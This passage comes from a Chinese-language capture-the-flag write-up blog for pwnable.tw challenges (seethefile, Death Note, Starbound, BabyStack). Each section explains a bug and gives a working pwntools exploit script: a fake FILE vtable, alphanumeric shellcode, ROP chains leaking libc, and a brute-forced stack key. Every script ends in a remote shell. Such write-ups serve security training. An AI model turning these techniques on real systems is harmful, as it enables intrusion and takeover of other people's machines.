class="line">free()</span><br><span class="line">free()</span><br><span class="line">malloc(<span class="number">0x28</span>,p64(free_hook))</span><br><span class="line">malloc(<span class="number">0x28</span>,p64(free_hook))</span><br><span class="line">malloc(<span class="number">0x28</span>,p64(onegadget))</span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<h1>seethefile</h1>
<p>我觉得他已经暗示了这是道IO_file的题目了… 可以进行几种文件操作(打开、读取、写到屏幕、关闭)，最后的关闭程序时有个溢出漏洞，可以通过name的溢出覆盖文件的fp，伪造假的_IO_FILE_plus结构就可getshell (说是这么简单。。。)，这题有几个放水的地方，一个是PIE是关闭的，所以bss段的地址已知，写在bss上的东西就可以直接用了；一个是程序把几个变量都放在了bss段，这样才会有上面说的溢出(好像那两东西不放bss也不行hhhh)；一个是可以读处flag(做了某些过滤)以外的文件，读一下/proc/self/maps就可以拿到libc的基址。（反正就是道挺好的IO_file的练手题了）</p>
<p>IO_file<a target="_blank" rel="noopener" href="http://blog.eonew.cn/archives/1103">网上</a>也有很多教程，这里水过一下就算了(懒 - -)，首先上面说了可以伪造一个_IO_FILE_plus结构体，伪造结构体主要造一下_IO_FILE_plus.vtable就行，vtable是一个(const struct _IO_jump_t)类型的结构体(据说跟C++的重载函数差不多)，里面记录了一些文件操作相关的函数位址，通过覆盖/伪造里面的函数地址(比如改成system)就可以达到控制程序流的目的。然后据说vtable里面的函数的第一个参数是这个_IO_FILE本身【比如close的定义：JUMP_FIELD(_IO_close_t, __close);】，所以如果改成system的话把’/bin/sh\x00’放在伪造的结构体的头部就好了。</p>
<p>另外，在实践中发现在fclose中执行到【_IO_acquire_lock (fp);】这个地方程序会死掉，后来参考了<a target="_blank" rel="noopener" href="https://blog.yuuoniy.cn/2018/08/14/seethefile-writeup/">yuuoniy的wp</a>才知道要造一个假的lock (wtcl- -)，然后因为lock的结构跟IO_file的差不多所以可以直接用伪造的结构体放在lock的位置(具体看ta的wp 8)。</p>
<p>最终造出来的_IO_FILE_plus</p>
<img src="/p/pwnable-tw-writeup/10-1.png" class="" title="img_10-1">
<p>最终造出来的_IO_jump_t  (vtable)</p>
<img src="/p/pwnable-tw-writeup/10-2.png" class="" title="img_10-2">
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;139.162.123.119&#x27;</span>,<span class="number">10200</span>)  <span class="comment"># my shabby DNS ...</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;What do you want to see :&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;00:00 0&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(r.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[LEAK] libc_base -&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">libc_system = libc_base+<span class="number">0x3a940</span>  <span class="comment"># .</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[LEAK] libc_system -&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_system))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Leave your name :&#x27;</span>)</span><br><span class="line">name = <span class="number">0x804B260</span></span><br><span class="line"></span><br><span class="line">payload = [<span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line">payload[<span class="number">0</span>] = u32(<span class="string">&#x27;/bin&#x27;</span>)</span><br><span class="line">payload[<span class="number">1</span>] = u32(<span class="string">&#x27;/sh\x00&#x27;</span>)</span><br><span class="line">payload[<span class="number">0x20</span>/<span class="number">4</span>] = name</span><br><span class="line">payload[<span class="number">0x48</span>/<span class="number">4</span>] = name+<span class="number">0x10</span>  <span class="comment"># fake lock...</span></span><br><span class="line">payload[<span class="number">0x94</span>/<span class="number">4</span>] = name+<span class="number">0x98</span>-<span class="number">0x44</span></span><br><span class="line">payload[<span class="number">0x98</span>/<span class="number">4</span>] = libc_system</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(p32,payload))</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<p>getshell后好像因为权限问题，要通过里面提供的get_flag程序来拿flag，反正源码都给了，这里就不多说了 (逃</p>
<h1>Death Note</h1>
<p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%AD%BB%E4%BA%A1%E7%AC%94%E8%AE%B0">Death Note</a>好像是一部挺老的漫画了，好像是把谁的名字写到笔记上去那个人就会死掉(与题目无关hhhh)</p>
<p>题目已经提示了要写shellcode了，checksec发现有rwx的区域，程序的.bss和堆上都是rwx的(最终的选择是写在堆上，因为输入的name放在了堆)。代码中还有个is_printable函数(对，题目很好心的给了符号)，提示要alpha_numeric的shellcode，而且长度限制80bytes以下，网上找了一堆不是长度太长就是不能用的，最后还是自己写了(顺便当练习。</p>
<p>写shellcode前首先要找到可以执行shellcode的地方，程序中几个操作里都有一个id的检查，说id不能超过10，但是没有检查下限，所以输入负数的话会触发underflow漏洞。</p>
<img src="/p/pwnable-tw-writeup/11-1.png" class="" title="img_11-1">
<p>输入的id是作为note的下标，note有恰好在.bss上，所以选择适当的id就可以覆盖.got表的值，exp选择了free，因为free的参数就是某个堆块的地址，这样方便写shellcode。</p>
<p>接下来就是shellcode部分，alpha_numberic的shellcode写法在<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=9bHibgrjNlc">winesap的视频</a>中有详细的说明，可以参照一下。这里的大概就是：首先call free时eax是堆上一个块，加0x10后就是shellcode的基址，exp存到了edi中；通过某些神奇的操作可以得到0，方法不唯一，exp存到了esi寄存器中；通过‘xor    BYTE PTR [edi+0x37], al’指令可以修改shellcode的值，从而构造出’int 80’指令；通过xor的操作可以构造出不是alpha_numberic的参数，其中通过xor 0xff可以构造比较大的数，因为0xff可以通过’dec esi’即零减一得到，比较方便。然后最终构造出来的shellcode也就56bytes - -</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;139.162.123.119&#x27;</span>, <span class="number">10201</span>)  <span class="comment"># shabby DNS...</span></span><br><span class="line"></span><br><span class="line">TO = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, name</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Name :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Name : &#x27;</span>, timeout=TO)</span><br><span class="line">    data = r.recvuntil(<span class="string">&#x27;----&#x27;</span>, timeout=TO)</span><br><span class="line">    <span class="keyword">return</span> data[:-<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sh = (</span><br><span class="line">    <span class="string">&#x27;P[&#x27;</span> +              <span class="comment"># set ebx &lt;- &#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    <span class="string">&#x27;P_&#x27;</span>+<span class="string">&#x27;G&#x27;</span>*<span class="number">16</span> +       <span class="comment"># get shellcode base -&gt; edi</span></span><br><span class="line">    <span class="string">&#x27;VTX30&#x27;</span> +           <span class="comment"># get 0 -&gt; esi</span></span><br><span class="line">    <span class="string">&#x27;VX&#x27;</span>+<span class="string">&#x27;4F&#x27;</span>+<span class="string">&#x27;0G7&#x27;</span> +   <span class="comment"># </span></span><br><span class="line">    <span class="string">&#x27;NVX&#x27;</span>+<span class="string">&#x27;0G7&#x27;</span> +       <span class="comment"># change to 0x80; esi &lt;- -1</span></span><br><span class="line">    <span class="string">&#x27;VX&#x27;</span>+<span class="string">&#x27;0G6&#x27;</span> +        <span class="comment"># change to 0xcd</span></span><br><span class="line">    <span class="string">&#x27;F&#x27;</span> +               <span class="comment"># set esi &lt;- 0</span></span><br><span class="line">    <span class="string">&#x27;VY&#x27;</span> +              <span class="comment"># set ecx &lt;- 0</span></span><br><span class="line">    <span class="string">&#x27;VZ&#x27;</span> +              <span class="comment"># set edx &lt;- 0</span></span><br><span class="line">    <span class="string">&#x27;VX&#x27;</span>+<span class="string">&#x27;49&#x27;</span>+<span class="string">&#x27;42&#x27;</span> +    <span class="comment"># set eax &lt;- 11</span></span><br><span class="line">    <span class="string">&#x27;29&#x27;</span>                <span class="comment"># int 80; &#x27;2&#x27;^0xff-&gt;0xcd ; &#x27;9&#x27;^&#x27;i&#x27;-&gt;0x80</span></span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;len -&gt; &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(sh)))</span><br><span class="line"></span><br><span class="line">add(-<span class="number">19</span>, sh)</span><br><span class="line">hack = delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<h1>Starbound</h1>
<p><a target="_blank" rel="noopener" href="https://playstarbound.com/">startbound</a>好像是一个游戏，题目程序就是个命令行版的(感觉就是个2D版的MC)，因为是个真正可以玩的游戏所以要逆向的工作量会有点大，当时花了一段时间逆了大部分后才发现漏洞就在main函数里。</p>
<img src="/p/pwnable-tw-writeup/12-1.png" class="" title="img_12-1">
<p>首先要说一下程序的菜单功能，图中的menu_now(名字是我乱取的)其实是个全局的函数指针，会有别的函数设置这个变量来显示不同的菜单；同样menu_option_now(名字也是我乱取的)是当前菜单对应的几个功能的函数指针，这里的index其实有个挺明显(但不知道为什么我一开始没发现)的溢出，输入10以上或负数可以执行别的函数，因为是bss上的，所以负数的话刚好可以执行玩家name的地方，name可以在setting里设置，可设置成ROP或程序自带的函数。</p>
<p>本来这种情况最简单的做法就是one_gadget了，但题目没有给libc，于是想到另一个方法(解法应该不唯一)，先执行一个&quot;add esp, 0x1c&quot;的ROP打乱stack，再使nptr造成溢出用常规的栈溢出方法来做。其实写ROP时也需要用到libc的，可以用DynELF泄露，但更简单的方法是查<a target="_blank" rel="noopener" href="https://libc.blukat.me/">libc_database</a>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10202</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setName</span>(<span class="params">name</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;  7. Multiplayer\n&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;  4. Toggle View\n&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Enter your name: &#x27;</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;  4. Toggle View\n&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add_esp_0x1c_ret = <span class="number">0x08048e48</span></span><br><span class="line"></span><br><span class="line">setName(p32(add_esp_0x1c_ret))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pop3</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;  7. Multiplayer\n&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;-33&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">5</span>)+p32(<span class="number">0x804a664</span>))</span><br><span class="line">pop3()</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x8058900</span></span><br><span class="line">pop_ebp = <span class="number">0x080491bc</span></span><br><span class="line">pop_esi_edi_ebp = <span class="number">0x080491ba</span></span><br><span class="line">leave_ret = <span class="number">0x08048c58</span></span><br><span class="line">puts_plt = <span class="number">0x8048B90</span></span><br><span class="line">puts_got = <span class="number">0x805509C</span></span><br><span class="line">read_plt = <span class="number">0x8048A70</span></span><br><span class="line"></span><br><span class="line">rop1 = flat(<span class="built_in">map</span>(p32,[</span><br><span class="line">    puts_plt, pop_ebp, puts_got,  <span class="comment"># get libc_base</span></span><br><span class="line">    read_plt, pop_esi_edi_ebp, <span class="number">0</span>, bss, <span class="number">4</span>*<span class="number">6</span>+<span class="number">1</span>,  <span class="comment"># read rop2</span></span><br><span class="line">    pop_ebp, bss-<span class="number">4</span>, leave_ret</span><br><span class="line">]))</span><br><span class="line">r.recv(timeout=<span class="number">2</span>)</span><br><span class="line">r.recv(timeout=<span class="number">2</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;8aaaaaaa&#x27;</span>+rop1)</span><br><span class="line">libc_puts = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[LEAK]libc_puts -&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_puts))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc6_2.23-0ubuntu10_i386</span></span><br><span class="line">libc_base = libc_puts - <span class="number">0x05fca0</span></span><br><span class="line">libc_system = libc_base + <span class="number">0x03ada0</span></span><br><span class="line"></span><br><span class="line">rop2 = flat(<span class="built_in">map</span>(p32,[</span><br><span class="line">    libc_system, pop_ebp, bss+<span class="number">4</span>*<span class="number">4</span>,</span><br><span class="line">    <span class="number">0xdeadbeef</span></span><br><span class="line">]))</span><br><span class="line">rop2 += <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendline(rop2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<h1>BabyStack</h1>
<p>实际上就是个栈溢出，不过覆盖ret value要绕过几个限制。</p>
<p>首先是登录，而且有一个magic copy的功能需要先登录成功才能进入。登录的话会把输入的密码和一串16bytes的随机密钥进行对比，在对比时用了strncmp函数，所以如果输回车的话可以直接登录成功。利用一下strncmp还可以进行密钥的爆破(程序的初始化中alarm了半个小时应该也暗示了要爆破的了)，要爆破密钥是因为main退出时会检查密钥有没被更换，有的话会触发__stack_chk_fail，跟canary一样。除了密钥能爆破外，爆破一下16bytes密钥后面的内容可以拿到程序基址，方便写ROP。</p>
<p>然后是magic copy，里面用到了个不怎么安全的strcpy函数，而它的dest是main函数的一个buffer(局部变量，64bytes，栈上)，src是这个函数里的局部变量而且有128bytes，所以可以造成main函数的栈溢出。但magic copy函数里只能输入63bytes，所以ROP其实是登录的函数里输的，利用登录函数返回后栈没有被清掉。</p>
<p>然后就是普通的栈溢出做法了。因为main只能溢出3句ROP，23个bytes(而且我自己操作时不知道为什么会被零截断)，所以可以利用一下rdi保留的栈地址和程序自带的输入函数(大概是像readn那样的那个)来输入更长的ROP。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10205</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">password</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Your passowrd :&#x27;</span>)</span><br><span class="line">    r.sendline(password)</span><br><span class="line">    <span class="keyword">return</span> r.recv(<span class="number">5</span>)==<span class="string">&#x27;Login&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span>():</span></span><br><span class="line">    pas = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> c==<span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span>(login(pas+<span class="built_in">chr</span>(c))):</span><br><span class="line">                pas += <span class="built_in">chr</span>(c)</span><br><span class="line">                r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                <span class="comment">#print(&#x27;[CRACK] -&gt; &#x27;+pas)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[CRACK] -&gt; &#x27;</span>+<span class="built_in">hex</span>(c))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> pas</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack2</span>(<span class="params">st, num</span>):</span></span><br><span class="line">    pas = st</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num-<span class="built_in">len</span>(pas)):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> c==<span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span>(login(pas+<span class="built_in">chr</span>(c))):</span><br><span class="line">                pas += <span class="built_in">chr</span>(c)</span><br><span class="line">                r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                <span class="comment">#print(&#x27;[CRACK] -&gt; &#x27;+pas)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[CRACK] -&gt; &#x27;</span>+<span class="built_in">hex</span>(c))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> pas</span><br><span class="line"></span><br><span class="line">password = crack()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[INFO] password -&gt; &#x27;</span>+<span class="built_in">str</span>(password).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">15</span>)</span><br><span class="line">code_base = u64((crack2(password+<span class="string">&#x27;1\n&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">13</span>+<span class="string">&#x27;\n\x60&#x27;</span>, <span class="number">16</span>+<span class="number">16</span>+<span class="number">5</span>)[<span class="number">32</span>:]+<span class="string">&#x27;\x55&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1060</span>  <span class="comment"># .</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[INFO] code_base -&gt; &#x27;</span>+<span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line">readn = code_base+<span class="number">0xCA0</span></span><br><span class="line">pop_rsi_r15 = code_base+<span class="number">0x10c1</span></span><br><span class="line"></span><br><span class="line">payload = flat(<span class="built_in">map</span>(p64,[</span><br><span class="line">    pop_rsi_r15, <span class="number">0x1000</span>, <span class="number">0</span>, readn</span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendROP</span>(<span class="params">rop</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Your passowrd :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;b&#x27;</span>*<span class="number">64</span>+password+<span class="string">&#x27;c&#x27;</span>*<span class="number">16</span>+<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>+rop)</span><br><span class="line">sendROP(p64(readn)[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">login(password)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Copy :&#x27;</span>)</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">63</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop2</span></span><br><span class="line">bss = code_base+<span class="number">0x202900</span></span><br><span class="line">puts_got = code_base+<span class="number">0x201F60</span></span><br><span class="line">puts_plt = code_base+<span class="number">0xAE0</span></span><br><span class="line">pop_rdi = code_base+<span class="number">0x10c3</span></span><br><span class="line">init_pop = code_base+<span class="number">0x10BA</span></span><br><span class="line">init_mov = code_base+<span class="number">0x10A0</span></span><br><span class="line">read_got = code_base+<span class="number">0x201FA8</span></span><br><span class="line">leave_ret = code_base+<span class="number">0xd0d</span></span><br><span class="line">pop_rbp = code_base+<span class="number">0xbd0</span></span><br><span class="line">payload2 = 